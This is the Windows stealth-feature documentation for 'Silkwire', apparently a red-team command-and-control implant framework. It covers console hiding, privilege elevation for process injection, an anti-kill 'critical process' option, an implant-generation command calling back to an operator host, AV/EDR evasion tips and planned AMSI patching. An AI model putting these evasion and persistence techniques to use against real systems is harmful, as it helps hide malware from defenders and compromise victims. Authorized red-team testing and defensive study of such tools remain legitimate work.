# Windows Stealth Features

## Overview

Silkwire implants now include advanced stealth features when running on Windows to avoid detection and maintain covert operations.

## Automatic Stealth Initialization

When a Silkwire implant runs on Windows, the following stealth measures are **automatically applied** before `main()` executes:

### 1. Console Window Hiding
- The console window is immediately hidden using `ShowWindow(SW_HIDE)`
- This prevents the telltale black console window from appearing
- Uses Windows API: `GetConsoleWindow()` + `ShowWindow()`

### 2. Process Detachment
- The implant detaches from the parent process
- STDIN/STDOUT/STDERR are redirected to `NUL` device
- This prevents blocking the parent terminal

### 3. Lower Process Priority
- Process priority is set to `BELOW_NORMAL_PRIORITY_CLASS`
- Reduces CPU usage visibility in Task Manager
- Makes the process less noticeable during system monitoring

### 4. Debug Privilege Elevation
- Automatically attempts to enable `SeDebugPrivilege`
- Required for process injection capabilities
- Allows the implant to inject into protected processes

## Build-Time Stealth

### GUI Subsystem Flag
When compiling Windows implants, the build system automatically adds:
```
-ldflags "-H windowsgui"
```

This flag:
- Changes the PE subsystem from CONSOLE to GUI
- Prevents Windows from allocating a console window
- Makes the binary run completely silently (no flash of console)

## Advanced Stealth Functions

The following functions are available but not enabled by default (use with caution):

### Make Process Critical
```go
MakeProcessCritical()
```
- Makes the process critical to Windows
- Terminating the process will cause a Blue Screen of Death (BSoD)
- **WARNING**: Very aggressive anti-kill technique
- Should only be used in controlled environments

### Single Instance Mutex
```go
mutex, err := CreateMutex("Global\\SilkwireImplant")
```
- Creates a named mutex to prevent multiple instances
- Useful for persistence mechanisms
- Checks if another instance is already running

## File Structure

### Implementation Files
- **`implant/stealth_windows.go`** - Windows-specific stealth code
- **`implant/stealth_unix.go`** - Unix stub (no-op)
- **`implant/main.go`** - Calls stealth functions at startup

### Build System
- **`server/implant_generator.go`** - Adds `-H windowsgui` flag for Windows builds

## Usage

### Standard Generation
```bash
# Generate Windows implant - stealth is automatic
silkwire >> generate --mtls 192.168.1.100:4444 --os windows
```

The generated implant will:
1. ✅ Hide console window immediately
2. ✅ Run with GUI subsystem (no console allocation)
3. ✅ Detach from parent process
4. ✅ Set low priority
5. ✅ Enable debug privileges

### Testing Stealth Behavior

To verify stealth operation:

1. **Generate Windows implant**:
   ```
   generate --mtls 192.168.1.100:4444 --os windows
   ```

2. **Transfer to Windows target**

3. **Execute implant**:
   - Double-click the .exe file
   - Or run from cmd.exe: `implant.exe`
   - **Expected**: No console window appears, process runs silently

4. **Verify in Task Manager**:
   - Process shows as "Background process"
   - Not visible in Applications tab
   - CPU usage should be minimal

## Platform Differences

### Windows
- Full stealth implementation active
- Console hiding + GUI subsystem
- Process priority lowering
- Debug privilege elevation

### Linux/macOS
- No special stealth needed
- Unix processes don't show console windows
- Can be backgrounded with `&` or `nohup`
- Stealth functions are no-ops

## Security Considerations

1. **AV/EDR Detection**: Modern security software may still detect:
   - Network connections
   - API call patterns
   - Memory signatures
   - Behavioral analysis

2. **OPSEC Tips**:
   - Combine with obfuscation (`--garble`)
   - Use appropriate beacon intervals
   - Consider enabling anti-debug/anti-VM
   - Test in target environment first

3. **Legal Warning**:
   - Only use on systems you own or have authorization to test
   - Stealth features are for legitimate security research
   - Unauthorized use may violate computer crime laws

## Troubleshooting

### Console Still Appears
- Ensure you're running the generated binary (not building locally)
- Check that the `-H windowsgui` flag was applied during build
- Verify Windows version compatibility (Win7+)

### Process Dies Immediately
- Check server logs for connection errors
- Verify TLS certificates are valid
- Try with `--debug true` to enable logging (note: less stealthy)

### Can't Inject Into Processes
- Ensure running with admin privileges
- Check that `SeDebugPrivilege` was enabled
- Target process may have protection (PPL, anti-cheat, etc.)

## Future Enhancements

Planned stealth features:
- [ ] Parent process spoofing (PPID spoofing)
- [ ] DLL order hijacking for persistence
- [ ] Registry-less operation
- [ ] In-memory only execution (fileless)
- [ ] Process hollowing for initial execution
- [ ] Syscall obfuscation
- [ ] ETW/AMSI patching

## References

- Windows Subsystem Types: https://docs.microsoft.com/en-us/windows/win32/debug/pe-format
- Process Privileges: https://docs.microsoft.com/en-us/windows/win32/secauthz/privileges
- Go Cross-Compilation: https://go.dev/doc/install/source#environment
